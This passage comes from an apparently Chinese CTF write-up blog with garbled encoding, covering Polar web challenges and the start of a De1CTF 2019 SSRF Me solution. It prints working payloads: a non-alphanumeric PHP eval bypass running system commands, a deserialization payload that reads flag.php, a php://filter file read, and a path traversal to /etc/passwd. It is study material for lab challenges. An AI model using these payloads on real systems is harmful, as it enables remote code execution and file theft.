&quot;.$ip);</span><br><span class="hljs-meta">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="hljs-meta">print_r($a);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">&lt;!--å…¶å®å°±æ˜¯å‡ºé¢˜äººå¤ªæ‡’äº†--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><br><br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span><span class="hljs-comment">&lt;!--å…¶å®å°±æ˜¯å‡ºé¢˜äººå¤ªæ‡’äº†--&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="wu"><a href="#wu" class="headerlink" title="wu:"></a>wu:</h4><p>ä»£ç å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-comment">//æ— æ•°å­—å­—æ¯ç»•è¿‡</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!&quot;</span>);<br>&#125;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B<br><br>POST:<br>_=system(&#x27;ls ./&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131600566.png" alt="image-20230923131600566"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?a=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B<br><br>POST:<br>_=system(&#x27;cat ./zheshiflag.php &#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923131710886.png" alt="image-20230923131710886"></p><h4 id="php-very-nice"><a href="#php-very-nice" class="headerlink" title="php very nice:"></a>php very nice:</h4><p>æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Example</span></span><br><span class="hljs-class"> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$sys</span>=<span class="hljs-string">&#x27;Can you find the leak?&#x27;</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>         <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;sys);<br>     &#125;<br> &#125;<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();<br><span class="hljs-variable">$obj</span>-&gt;sys = <span class="hljs-string">&quot;system(&#x27;cat ./flag.php&#x27;);&quot;</span>;<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$obj</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>;<br><br> <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=O%3A7%3A%22Example%22%3A1%3A%7Bs%3A3%3A%22sys%22%3Bs%3A25%3A%22system%28%27cat+.%2Fflag.php%27%29%3B%22%3B%7D<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923162344694.png" alt="image-20230923162344694"></p><h4 id="ä»£ç å®¡è®¡1"><a href="#ä»£ç å®¡è®¡1" class="headerlink" title="ä»£ç å®¡è®¡1:"></a>ä»£ç å®¡è®¡1:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sys&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;|flag|&quot;</span>, <span class="hljs-variable">$xsx</span>)) &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;flag is no here!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$xsx</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xsx&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$sys</span>(<span class="hljs-variable">$xsx</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=FilesystemIterator&amp;xsx=./<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923164401248.png" alt="image-20230923164401248"></p><p>ä½¿ç”¨phpåŸç”Ÿç±»è¿”å›flag.phpçš„å†…å®¹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?sys=SplFileObject&amp;xsx=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923172559963.png" alt="image-20230923172559963"></p><p><img src="/images/2023-9-24-Polar/image-20230923172610960.png" alt="image-20230923172610960"></p><h4 id="è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š"><a href="#è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š" class="headerlink" title="è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š"></a>è‡ªç”±çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼š</h4><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=upload/../sectet_include.php<br>/var/www/html/upload/4382754064<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨dirsearchï¼š<br><img src="/images/2023-9-24-Polar/image-20230923155441868.png" alt="image-20230923155441868"></p><p><img src="/images/2023-9-24-Polar/image-20230923155509582.png" alt="image-20230923155509582"></p><p><img src="/images/2023-9-24-Polar/image-20230923155519918.png" alt="image-20230923155519918"></p><p>å‘ç°æœ‰.gitæ³„éœ²ï¼Œä½†æ˜¯.gitæ³„éœ²æˆ‘æ²¡å‘ç°æœ‰ç”¨ä¿¡æ¯</p><p>.DS_Store:æ³„éœ²ä¹Ÿæ²¡æœ‰æœ‰ç”¨æ–‡ä»¶</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sectet_include.php?file=../../../etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/images/2023-9-24-Polar/image-20230923180939030.png" alt="image-20230923180939030"></p><p>å­˜åœ¨æ–‡ä»¶ç›®å½•ç©¿è¶Šï¼Œä¸è¿‡åˆ°æœ€åä¹Ÿæ²¡æœ‰ç©¿è¶Šå‡ºæ¥ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[De1CTF 2019]SSRF Me é¢˜è§£</title>
    <link href="/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/"/>
    <url>/2023/08/29/2023-08-29-%5BDe1CTF%202019%5DSSRF%20Me/</url>
    
    <content type="html"><![CDATA[<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><p>1.æŸ¥çœ‹æç¤º:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102629610.png" alt="image-20230829102629610"></p><p>2.æ‰“å¼€ç½‘é¡µ:<br><img src="/images/2023-8-29-SSRFMe/image-20230829102651916.png" alt="image-20230829102651916"></p><p>è§‚å¯Ÿä»£ç ï¼Œæ„Ÿè§‰æ˜¯flaskæ³¨å…¥,æ•´ç†ä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#! /usr/bin/env python #encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):<br>            <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                    result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br><br>                <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br><br><br>            <span class="hljs-keyword">else</span>:<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>                result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>            <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>3.ä»£ç å®¡è®¡:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 